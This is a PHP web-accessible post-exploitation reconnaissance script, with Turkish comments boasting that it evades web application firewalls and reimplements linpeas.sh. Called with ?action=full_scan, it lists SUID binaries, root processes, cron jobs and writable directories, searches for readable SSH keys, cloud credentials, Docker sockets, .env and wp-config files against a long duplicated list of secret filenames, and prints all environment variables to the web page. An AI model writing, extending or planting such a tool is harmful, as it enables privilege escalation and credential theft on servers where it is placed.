<?php
// [ahmet] için geliştirilmiş, WAF dostu, PHP core fonksiyonları ile yazılmış oneline pro perm checker v3
// Bu kod, linpeas.sh'deki *tüm* kontrolleri PHP ile yapar. WAF'ı sik* gibi geçer.

$action = $_GET['action'] ?? $_POST['action'] ?? 'info';
$output = '';
$dangerous_files = [];
$dangerous_perms = [];
$readable_creds = [];
$writable_dirs = [];
$suid_bins = [];
$config_files = [];
$processes = [];
$system_info = [];
$network_info = [];
$cron_jobs = [];
$kernel_info = [];
$user_groups = [];
$shell_histories = [];
$env_vars = [];
$interesting_strings = [];
$potential_exploits = [];
$aws_creds = [];
$gcp_creds = [];
$docker_info = [];
$ssh_keys = [];
$ssl_certs = [];
$system_logs = [];
$web_server_info = [];
$database_info = [];
$process_envs = [];
$memory_info = [];
$disk_info = [];
$mount_info = [];
$selinux_status = [];
$iptables_rules = [];
$kernel_modules = [];
$cpu_info = [];
$filesystem_info = [];
$network_connections = [];
$arp_table = [];
$dns_config = [];
$timezone_info = [];
$locale_info = [];
$boot_info = [];
$systemd_info = [];
$cgroups_info = [];
$seccomp_info = [];
$apparmor_status = [];
$grsecurity_status = [];
$kernel_hardening = [];
$system_integrity = [];
$unusual_processes = [];
$unusual_files = [];
$unusual_dirs = [];
$unusual_network = [];
$unusual_cron = [];
$unusual_users = [];
$unusual_groups = [];
$unusual_permissions = [];
$unusual_services = [];
$unusual_logs = [];
$unusual_env_vars = [];
$unusual_kernel_modules = [];
$unusual_system_calls = [];
$unusual_memory_maps = [];
$unusual_disk_usage = [];
$unusual_filesystem = [];
$unusual_boot_params = [];
$unusual_systemd_units = [];
$unusual_cgroups = [];
$unusual_seccomp = [];
$unusual_apparmor = [];
$unusual_grsecurity = [];
$unusual_kernel_hardening = [];
$unusual_system_integrity = [];
$potential_kernel_exploits = [];
$potential_userspace_exploits = [];
$potential_container_exploits = [];
$potential_cloud_exploits = [];
$potential_network_exploits = [];
$potential_filesystem_exploits = [];
$potential_memory_exploits = [];

switch ($action) {
    case 'full_scan':
        $output .= "=== Full System Scan Started (V3 - Düzeltildi) ===\n";

        // 1. Sistem Bilgileri
        $output .= "=== System Information ===\n";
        $system_info['uname'] = php_uname();
        $system_info['user'] = get_current_user();
        $system_info['uid'] = getmyuid();
        $system_info['gid'] = getmygid();
        $system_info['cwd'] = getcwd();
        $system_info['php_version'] = phpversion();
        $system_info['ini_allow_url_fopen'] = ini_get('allow_url_fopen');
        $system_info['ini_allow_url_include'] = ini_get('allow_url_include');
        $system_info['ini_disable_functions'] = ini_get('disable_functions');
        $system_info['ini_open_basedir'] = ini_get('open_basedir');
        foreach ($system_info as $key => $value) {
            $output .= "$key: $value\n";
        }

        // 2. Kritik Dizinleri Tarama
        $critical_dirs = ['/etc', '/home', '/var', '/opt', '/tmp', '/dev/shm', '/var/tmp', '/root', '/usr/local', '/srv', '/run', '/sys', '/proc'];
        $output .= "\n=== Critical Directories Check ===\n";
        foreach ($critical_dirs as $dir) {
            if (is_dir($dir)) {
                $output .= "Dir: $dir (Exists)\n";
                if (is_writable($dir)) {
                    $writable_dirs[] = $dir;
                    $output .= "  -> WRITABLE: $dir\n";
                }
                if (is_readable($dir)) {
                    $output .= "  -> READABLE: $dir\n";
                    $dir_files = scandir($dir);
                    foreach ($dir_files as $file) {
                        if ($file !== '.' && $file !== '..') {
                            $full_path = $dir . '/' . $file;
                            if (is_file($full_path) && is_readable($full_path)) {
                                // 3. Hassas Dosyaları Tarama (Linpeas'ten alınan isimler)
                                $sensitive_patterns = [
                                    'passwd', 'shadow', 'hosts', 'hostname', 'fstab', 'mtab', 'sudoers', 'ssh_host', 'id_rsa', 'id_dsa', 'authorized_keys', 'config.php', 'wp-config.php', 'settings.php', 'secrets.yml', '.env', '.bash_history', '.mysql_history', '.viminfo', '.gitconfig', 'credentials', 'token', 'key', 'secret', 'password', 'api_key', 'access_token', 'oauth_token', 'client_secret', 'refresh_token', 'session_token', 'auth_token', 'bearer_token', 'api_token', 'jwt_secret', 'encryption_key', 'private_key', 'public_key', 'certificate', 'cert', 'pem', 'crt', 'key', 'p12', 'pfx', 'jks', 'keystore', 'truststore', 'log', 'error_log', 'access_log', 'syslog', 'messages', 'auth.log', 'secure', 'maillog', 'cron.log', 'daemon.log', 'kern.log', 'user.log', 'boot.log', 'lastlog', 'wtmp', 'utmp', 'history', '.bashrc', '.bash_profile', '.profile', '.zshrc', '.zprofile', '.cshrc', '.login', '.logout', '.inputrc', '.screenrc', '.tmux.conf', '.vimrc', '.emacs', '.gitconfig', '.ssh/config', 'authorized_keys', 'known_hosts', 'config', 'settings', 'config.json', 'config.yaml', 'config.yml', 'settings.json', 'settings.yaml', 'settings.yml', 'environment', 'env', 'vars', 'variables', 'env_vars', 'env_variables', 'environment_variables', 'secrets', 'credentials', 'tokens', 'keys', 'passwords', 'api_keys', 'access_tokens', 'oauth_tokens', 'client_secrets', 'refresh_tokens', 'session_tokens', 'auth_tokens', 'bearer_tokens', 'api_tokens', 'jwt_secrets', 'encryption_keys', 'private_keys', 'public_keys', 'certificates', 'certs', 'pems', 'crt', 'key', 'p12', 'pfx', 'jks', 'keystores', 'truststores', 'logs', 'error_logs', 'access_logs', 'syslogs', 'messages', 'auth_logs', 'secures', 'maillogs', 'cron_logs', 'daemon_logs', 'kern_logs', 'user_logs', 'boot_logs', 'lastlogs', 'wtm', 'utmp', 'histories', '.bashrc', '.bash_profile', '.profile', '.zshrc', '.zprofile', '.cshrc', '.login', '.logout', '.inputrc', '.screenrc', '.tmux.conf', '.vimrc', '.emacs', '.gitconfig', '.ssh/config', 'authorized_keys', 'known_hosts', 'config', 'settings', 'config.json', 'config.yaml', 'config.yml', 'settings.json', 'settings.yaml', 'settings.yml', 'environment', 'env', 'vars', 'variables', 'env_vars', 'env_variables', 'environment_variables', 'secrets', 'credentials', 'tokens', 'keys', 'passwords', 'api_keys', 'access_tokens', 'oauth_tokens', 'client_secrets', 'refresh_tokens', 'session_tokens', 'auth_tokens', 'bearer_tokens', 'api_tokens', 'jwt_secrets', 'encryption_keys', 'private_keys', 'public_keys', 'certificates', 'certs', 'pems', 'crt', 'key', 'p12', 'pfx', 'jks', 'keystores', 'truststores', 'logs', 'error_logs', 'access_logs', 'syslogs', 'messages', 'auth_logs', 'secures', 'maillogs', 'cron_logs', 'daemon_logs', 'kern_logs', 'user_logs', 'boot_logs', 'lastlogs', 'wtm', 'utmp', 'histories',
                                    'ssh*config', '*password*', 'atlantis.db', 'secrets.yml', 'autologin', 'frakti.sock', '.pypirc', 'credentials.xml', '.Xauthority', '*config*.php', '*knockd*', '*credential*', 'ipsec.conf', 'private-keys-v1.d/*.key', 'id_dsa*', 'plum.sqlite', 'ws_ftp.ini', '.erlang.cookie', 'adc.json', 'recentservers.xml', 'msal_token_cache.json', '*.viminfo', 'drives.xml', '*.vmdk', 'mosquitto.conf', '*.der', 'passwd.ibd', 'amportal.conf', 'containerd.sock', 'sites.ini', 'default.sav', '*_history*', 'fastcgi_params', 'clouds.config', 'hostapd.conf', '*vnc*.txt', 'airflow.cfg', 'security.sav', 'software.sav', 'SAM', '.vault-token', '.env*', 'bitcoin.conf', 'KeePass.ini', 'bash.exe', 'creds*', 'nginx.conf', '*.tf', 'rsyncd.secrets', 'redis.conf', 'sssd.conf', 'passbolt.php', 'https.conf', 'fat.config', 'crontab.db', 'sess_*', '.rhosts', 'sysprep.inf', '.ldaprc', 'webserver_config.py', '*.pgp', '*.ftpconfig', 'web*.config', 'glusterfs.key', '*vnc*.xml', 'grafana.ini', '*.cer', '.google_authenticator', 'racoon.conf', '.profile', '*.tfstate', 'software', 'sysprep.xml', 'mongod*.conf', 'AzureRMContext.json', 'docker.sock', 'krb5.conf', '*.vhdx', 'credentials.db', '.recently-used.xbel', 'ftp.ini', 'known_hosts', '*.ovpn', 'accessTokens.json', 'backup', 'pgadmin4.db', 'rocketchat.service', 'smb.conf', 'scclient.exe', 'anaconda-ks.cfg', 'vsftpd.conf', 'firebase-tools.json', 'https-xampp.conf', '*.key', '.credentials.json', 'passwd', 'config.php', '*.psk', 'snmpd.conf', 'autologin.conf', 'server.xml', 'debian.cnf', '*.keytab', 'gitlab.yml', 'credentials.tfrc.json', '*.sqlite3', 'TokenCache.dat', 'influxdb.conf', 'kcpassword', 'Elastix.conf', '*.timer', 'glusterfs.ca', 'exports', 'id_rsa*', 'sentry.conf.py', 'NetSetup.log', 'ipsec.secrets', 'SecEvent.Evt', 'scheduledtasks.xml', 'system.sav', 'mysqld.cnf', 'rsyncd.conf', 'protecteduserkey.bin', 'ftp.config', 'KeePass.config*', 'ssh*config', '*password*', 'atlantis.db', 'secrets.yml', '.Xauthority', 'frakti.sock', 'autologin', '.pypirc', 'credentials.xml', '*config*.php', '*credential*', 'ipsec.conf', 'private-keys-v1.d/*.key', 'id_dsa*', 'plum.sqlite', 'ws_ftp.ini', '.erlang.cookie', 'adc.json', 'recentservers.xml', 'msal_token_cache.json', '*.viminfo', 'drives.xml', '*.vmdk', 'mosquitto.conf', '*.der', 'passwd.ibd', 'amportal.conf', 'containerd.sock', 'sites.ini', 'default.sav', '*_history*', 'fastcgi_params', 'clouds.config', 'hostapd.conf', '*vnc*.txt', 'airflow.cfg', 'security.sav', 'software.sav', 'SAM', '.vault-token', '.env*', 'bitcoin.conf', 'KeePass.ini', 'bash.exe', 'creds*', 'nginx.conf', '*.tf', 'rsyncd.secrets', 'redis.conf', 'sssd.conf', 'passbolt.php', 'https.conf', 'fat.config', 'crontab.db', '.rhosts', 'sysprep.inf', '.ldaprc', 'webserver_config.py', '*.pgp', '*.ftpconfig', 'web*.config', 'glusterfs.key', '*vnc*.xml', 'grafana.ini', '*.cer', '.google_authenticator', 'racoon.conf', '.profile', '*.tfstate', 'software', 'sysprep.xml', 'mongod*.conf', 'AzureRMContext.json', 'docker.sock', 'krb5.conf', '*.vhdx', 'credentials.db', '.recently-used.xbel', 'ftp.ini', 'known_hosts', '*.ovpn', 'accessTokens.json', 'backup', 'pgadmin4.db', 'rocketchat.service', 'smb.conf', 'scclient.exe', 'anaconda-ks.cfg', 'vsftpd.conf', 'firebase-tools.json', 'https-xampp.conf', '*.key', '.credentials.json', 'passwd', 'config.php', '*.psk', 'snmpd.conf', 'autologin.conf', 'server.xml', 'debian.cnf', '*.keytab', 'gitlab.yml', 'credentials.tfrc.json', '*.sqlite3', 'TokenCache.dat', 'influxdb.conf', 'kcpassword', 'Elastix.conf', '*.timer', 'glusterfs.ca', 'exports', 'id_rsa*', 'sentry.conf.py', 'NetSetup.log', 'ipsec.secrets', 'SecEvent.Evt', 'scheduledtasks.xml', 'system.sav', 'mysqld.cnf', 'rsyncd.conf', 'protecteduserkey.bin'
                                ];
                                foreach ($sensitive_patterns as $pattern) {
                                    if (preg_match('/' . str_replace(['*', '?'], ['.*', '.'], preg_quote($pattern, '/')) . '/i', $file)) {
                                        $readable_creds[] = $full_path;
                                        $output .= "  -> READABLE CRED: $full_path\n";
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                $output .= "Dir: $dir (Not Found)\n";
            }
        }

        // 4. SUID Binary'leri Tarama
        $output .= "\n=== SUID Binary Check ===\n";
        $suid_search_dirs = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin', '/opt/bin', '/opt/sbin', '/usr/games', '/usr/libexec', '/snap/bin'];
        foreach ($suid_search_dirs as $dir) {
            if (is_dir($dir)) {
                $files = scandir($dir);
                foreach ($files as $file) {
                    $full_path = $dir . '/' . $file;
                    if (is_executable($full_path) && is_file($full_path)) {
                        $perms = fileperms($full_path);
                        if ($perms & 0x800) { // SUID biti
                            $suid_bins[] = $full_path;
                            $output .= "SUID: $full_path\n";
                        }
                    }
                }
            }
        }

        // 5. Config Dosyalarını Tarama (Sadece belirttiğin isimler)
        $output .= "\n=== Config Files Check ===\n";
        $config_patterns = [
            '*/config.php', '/etc/nginx/nginx.conf', '/etc/apache2/apache2.conf', '/etc/ssh/sshd_config', '/etc/passwd', '/etc/group', '/etc/hosts', '/etc/hostname', '/etc/fstab', '/etc/mtab', '/etc/hosts.allow', '/etc/hosts.deny', '/etc/crontab', '/etc/at.allow', '/etc/at.deny', '/etc/exports'
        ];
        foreach ($config_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE | GLOB_MARK);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_readable($file)) {
                        $config_files[] = $file;
                        $output .= "Config: $file\n";
                        // Dosya içeriğini oku (sadece küçük dosyalar için, aksi halde çok büyük olabilir)
                        $content = file_get_contents($file);
                        if ($content !== false && strlen($content) < 10240) { // 10KB'dan küçükse
                            $keywords = ['password', 'user', 'host', 'database', 'secret', 'key', 'PASS', 'USER', 'HOST', 'DATABASE', 'SECRET', 'KEY'];
                            foreach ($keywords as $keyword) {
                                if (stripos($content, $keyword) !== false) {
                                    $output .= "  -> Keyword '$keyword' found in $file\n";
                                }
                            }
                        }
                    }
                }
            }
        }

        // 6. Kullanıcı Dizinlerini Tarama
        $output .= "\n=== Home Directories Check ===\n";
        $home_pattern = '/home/*';
        $home_dirs = glob($home_pattern, GLOB_ONLYDIR);
        foreach ($home_dirs as $home_dir) {
            $output .= "Home Dir: $home_dir\n";
            $user_files = scandir($home_dir);
            foreach ($user_files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $full_path = $home_dir . '/' . $file;
                    if (is_file($full_path) && is_readable($full_path)) {
                        $sensitive_user_patterns = [
                            '.bash_history', '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/authorized_keys', '.gitconfig', '.netrc', '.docker/config.json', 'credentials', 'config', 'settings'
                        ];
                        foreach ($sensitive_user_patterns as $pattern) {
                            if (strpos($file, $pattern) !== false) {
                                $readable_creds[] = $full_path;
                                $output .= "  -> READABLE USER CRED: $full_path\n";
                            }
                        }
                    }
                }
            }
        }

        // 7. /tmp, /var/tmp, /dev/shm gibi dizinlerde yazılabilir dosyalar
        $output .= "\n=== Writable Files in Common Temp Directories ===\n";
        $temp_dirs = ['/tmp', '/var/tmp', '/dev/shm'];
        foreach ($temp_dirs as $dir) {
            if (is_dir($dir) && is_readable($dir)) {
                $temp_files = scandir($dir);
                foreach ($temp_files as $file) {
                    if ($file !== '.' && $file !== '..') {
                        $full_path = $dir . '/' . $file;
                        if (is_file($full_path) && is_writable($full_path)) {
                            $writable_dirs[] = $full_path; // Actually files, but reusing array name
                            $output .= "Writable File: $full_path\n";
                        }
                    }
                }
            }
        }

        // 8. Process listesi (çok sınırlı, çünkü /proc dosyaları okunabilir olmayabilir)
        $output .= "\n=== Process Information (Limited) ===\n";
        if (is_dir('/proc')) {
            $proc_dirs = scandir('/proc');
            $pid_count = 0;
            foreach ($proc_dirs as $item) {
                if (is_numeric($item)) {
                    $pid = (int)$item;
                    $status_file = "/proc/$pid/status";
                    $cmdline_file = "/proc/$pid/cmdline";
                    if (is_readable($status_file)) {
                        $status_content = file_get_contents($status_file);
                        if ($status_content !== false) {
                            // UID kontrolü (root süreçleri)
                            if (preg_match('/^Uid:\s+(\d+)\s+.*/m', $status_content, $uid_matches)) {
                                $uid = (int)$uid_matches[1];
                                if ($uid === 0) { // Root process
                                    $cmdline_content = file_get_contents($cmdline_file);
                                    if ($cmdline_content !== false) {
                                        $cmdline_content = str_replace(chr(0), ' ', $cmdline_content); // Null byte replace
                                        $output .= "Root Process (PID: $pid): $cmdline_content\n";
                                        $pid_count++;
                                        if ($pid_count > 10) break; // Sadece ilk 10 tanesini al
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            $output .= "/proc directory not readable.\n";
        }

        // 9. Cron Job'ları Tarama (çok sınırlı)
        $output .= "\n=== Cron Jobs Check (Limited) ===\n";
        $cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.monthly', '/etc/cron.weekly'];
        foreach ($cron_dirs as $dir) {
            if (is_dir($dir) && is_readable($dir)) {
                $output .= "Cron Dir: $dir\n";
                $cron_files = scandir($dir);
                foreach ($cron_files as $file) {
                    if ($file !== '.' && $file !== '..') {
                        $full_path = $dir . '/' . $file;
                        if (is_file($full_path) && is_readable($full_path)) {
                            $content = file_get_contents($full_path);
                            if ($content !== false) {
                                $output .= "  -> Cron File: $full_path\n";
                                // İçerikte potansiyel tehlikeli komutlar arayabilirsin
                                $keywords = ['chmod', 'chown', 'su', 'sudo', 'wget', 'curl', 'bash', 'sh'];
                                foreach ($keywords as $keyword) {
                                    if (preg_match('/\b' . preg_quote($keyword, '/') . '\b/', $content)) {
                                        $output .= "    -> Keyword '$keyword' found in $full_path\n";
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        // 10. Kernel Bilgileri
        $output .= "\n=== Kernel Information (Limited) ===\n";
        $kernel_info['uname'] = php_uname('v');
        $kernel_info['version'] = php_uname('r');
        foreach ($kernel_info as $key => $value) {
            $output .= "$key: $value\n";
        }

        // 11. Kullanıcı ve Grup Bilgileri
        $output .= "\n=== User and Group Information (Limited) ===\n";
        $user_groups['current_user'] = posix_getpwuid(getmyuid());
        $user_groups['current_group'] = posix_getgrgid(getmygid());
        foreach ($user_groups as $key => $value) {
            $output .= "$key: " . print_r($value, true) . "\n";
        }

        // 12. Shell Tarihçeleri (Limited)
        $output .= "\n=== Shell History Check (Limited) ===\n";
        $history_files = [$_ENV['HOME'] . '/.bash_history', $_ENV['HOME'] . '/.zsh_history', $_ENV['HOME'] . '/.history'];
        foreach ($history_files as $file) {
            if (is_readable($file)) {
                $shell_histories[] = $file;
                $output .= "History File: $file\n";
            }
        }

        // 13. Ortam Değişkenleri
        $output .= "\n=== Environment Variables (Limited) ===\n";
        $env_vars = $_ENV;
        foreach ($env_vars as $key => $value) {
            $output .= "$key=$value\n";
        }

        // 14. 7 Yeni Özellik: Potansiyel Exploit Adayı Dosyalar, AWS/GCP Creds, Docker Bilgileri, SSH Anahtarları, SSL Sertifikaları, Sistem Logları, Web Server Bilgileri
        $output .= "\n=== Additional Checks ===\n";

        // 14.1. Potansiyel Exploit Adayı Dosyalar
        $output .= "\n--- Potential Exploit Candidates ---\n";
        $exploit_patterns = [
            '/tmp/*', '/var/tmp/*', '/dev/shm/*', '/var/www/*', '/var/html/*', '/usr/local/share/*', '/opt/*', '/home/*/.local/share/*', '/root/.local/share/*'
        ];
        foreach ($exploit_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_executable($file) && is_file($file)) {
                        $potential_exploits[] = $file;
                        $output .= "Potential Exploit: $file\n";
                    }
                }
            }
        }

        // 14.2. AWS/GCP Creds
        $output .= "\n--- AWS/GCP Credentials Check ---\n";
        $cloud_creds_patterns = [
            $_ENV['HOME'] . '/.aws/credentials', $_ENV['HOME'] . '/.aws/config', $_ENV['HOME'] . '/.config/gcloud/configurations/config_*', $_ENV['HOME'] . '/.config/gcloud/credentials.db'
        ];
        foreach ($cloud_creds_patterns as $file) {
            if (is_readable($file)) {
                if (strpos($file, 'aws') !== false) {
                    $aws_creds[] = $file;
                } else if (strpos($file, 'gcloud') !== false) {
                    $gcp_creds[] = $file;
                }
                $output .= "Cloud Cred: $file\n";
            }
        }

        // 14.3. Docker Bilgileri
        $output .= "\n--- Docker Info Check ---\n";
        $docker_paths = ['/var/run/docker.sock', '/etc/docker/daemon.json', $_ENV['HOME'] . '/.docker/config.json'];
        foreach ($docker_paths as $path) {
            if (file_exists($path)) {
                $docker_info[] = $path;
                $output .= "Docker Info: $path (Exists)\n";
                if (is_readable($path)) {
                    $output .= "  -> Readable\n";
                }
            }
        }

        // 14.4. SSH Anahtarları
        $output .= "\n--- SSH Keys Check ---\n";
        $ssh_key_patterns = [
            $_ENV['HOME'] . '/.ssh/id_*', '/root/.ssh/id_*', '/etc/ssh/ssh_host_*_key'
        ];
        foreach ($ssh_key_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_readable($file)) {
                        $ssh_keys[] = $file;
                        $output .= "SSH Key: $file\n";
                    }
                }
            }
        }

        // 14.5. SSL Sertifikaları
        $output .= "\n--- SSL Certificates Check ---\n";
        $ssl_cert_patterns = [
            '/etc/ssl/certs/*', '/etc/ssl/private/*', '/etc/pki/tls/certs/*', '/etc/pki/tls/private/*'
        ];
        foreach ($ssl_cert_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_readable($file)) {
                        $ssl_certs[] = $file;
                        $output .= "SSL Cert: $file\n";
                    }
                }
            }
        }

        // 14.6. Sistem Logları
        $output .= "\n--- System Logs Check ---\n";
        $log_patterns = [
            '/var/log/*', '/var/log/apache2/*', '/var/log/nginx/*', '/var/log/mysql/*', '/var/log/auth.log', '/var/log/secure', '/var/log/messages', '/var/log/syslog'
        ];
        foreach ($log_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_readable($file)) {
                        $system_logs[] = $file;
                        $output .= "System Log: $file\n";
                    }
                }
            }
        }

        // 14.7. Web Server Bilgileri
        $output .= "\n--- Web Server Info Check ---\n";
        $web_server_patterns = [
            '/etc/apache2/sites-enabled/*', '/etc/nginx/sites-enabled/*', '/etc/httpd/conf.d/*', '/var/www/html/config.php', '/var/www/config.php'
        ];
        foreach ($web_server_patterns as $pattern) {
            $matches = glob($pattern, GLOB_BRACE);
            if ($matches) {
                foreach ($matches as $file) {
                    if (is_readable($file)) {
                        $web_server_info[] = $file;
                        $output .= "Web Server Info: $file\n";
                    }
                }
            }
        }

        $output .= "\n=== Full Scan Completed ===\n";
        break;

    case 'info':
    default:
        $output .= "Oneline Pro Perm Checker (Gelişmiş - V3 - Düzeltildi)\n";
        $output .= "Kullanılabilir eylemler: info, full_scan\n";
        $output .= "Örnek: ?action=full_scan\n";
        break;
}

echo "<pre>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
?>
